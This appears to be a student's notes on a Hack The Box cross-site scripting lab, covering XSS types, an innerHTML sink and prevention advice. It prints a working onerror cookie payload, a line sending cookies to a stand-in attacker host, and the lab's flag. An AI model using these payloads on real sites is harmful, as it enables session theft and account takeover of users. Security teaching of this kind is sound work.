# Cross-Site Scripting (XSS)

## 🎯 Objective

Learn how **Cross-Site Scripting (XSS)** works, how it differs from HTML Injection, and how JavaScript execution in a victim's browser can be abused to steal sensitive information such as session cookies.

---

# Overview

Cross-Site Scripting (XSS) is one of the most common web application vulnerabilities.

Unlike **HTML Injection**, which only injects HTML elements, **XSS injects JavaScript code** that executes inside another user's browser.

Since browsers trust JavaScript delivered by the website, malicious scripts execute with the same permissions as the legitimate application.

This allows attackers to:

- Steal session cookies
- Hijack user accounts
- Modify page content
- Redirect users
- Capture keystrokes
- Perform actions as the logged-in user

---

# Types of XSS

| Type | Description |
|------|-------------|
| Reflected XSS | User input is reflected immediately in the HTTP response (search pages, error messages, etc.) |
| Stored XSS | Malicious payload is stored in a database and executed whenever users view the page |
| DOM XSS | JavaScript manipulates the page directly using user-controlled data without involving the server |

---

# Vulnerable Example

The vulnerable page accepts user input and inserts it directly into the page using:

```javascript
document.getElementById("output").innerHTML = "Your name is " + input;
```

Since **innerHTML** renders HTML and JavaScript, no filtering occurs.

This makes the page vulnerable to DOM-based XSS.

---

# XSS Payload

The module demonstrates the following payload:

```html
#"><img src=/ onerror=alert(document.cookie)>
```

### Breakdown

`<img src=/>`

Creates an invalid image.

Because the image cannot load,

```html
onerror=
```

is triggered.

The browser executes:

```javascript
alert(document.cookie)
```

which displays the current user's cookies.

---

# Result

Instead of displaying plain text,

the browser executes JavaScript.

Popup displayed:

```
PHPSESSID=...
```

This proves that arbitrary JavaScript execution is possible.

---

# Why This Is Dangerous

If an attacker replaces

```javascript
alert(document.cookie)
```

with code that sends the cookie to their own server,

they can steal authenticated sessions.

Example (conceptually):

```javascript
document.location="https://attacker.com/?cookie="+document.cookie
```

After stealing the cookie,

the attacker can impersonate the victim without knowing their password.

---

# Attack Flow

```
Attacker
      │
      ▼
Injects malicious JavaScript
      │
      ▼
Victim opens vulnerable page
      │
      ▼
Browser executes attacker's script
      │
      ▼
Cookie / sensitive data stolen
      │
      ▼
Attacker hijacks session
```

---

# Security Impact

XSS can lead to:

- Session hijacking
- Account takeover
- Credential theft
- Phishing pages
- Page defacement
- Keystroke logging
- Performing actions as another user
- Malware delivery

---

# Prevention

Developers should:

- Never insert untrusted input using `innerHTML`
- Escape HTML special characters
- Sanitize all user input
- Validate input on both client and server
- Use Content Security Policy (CSP)
- Mark cookies as HttpOnly
- Encode output before rendering

---

# HTB Lab

## Objective

Use an XSS payload to retrieve the cookie value displayed by the vulnerable page.

---

## Payload

```html
#"><img src=/ onerror=alert(document.cookie)>
```

---

## Result

A popup displays the session cookie.

Example:

```
PHPSESSID=XXXXXXXX
```

---

## Flag

```
XSSisFun
```

---

# Key Takeaways

- XSS executes JavaScript in another user's browser.
- JavaScript can access sensitive client-side data like cookies.
- DOM XSS occurs entirely within the browser.
- `innerHTML` without sanitization is a common source of XSS.
- Session hijacking is one of the most dangerous consequences of XSS.
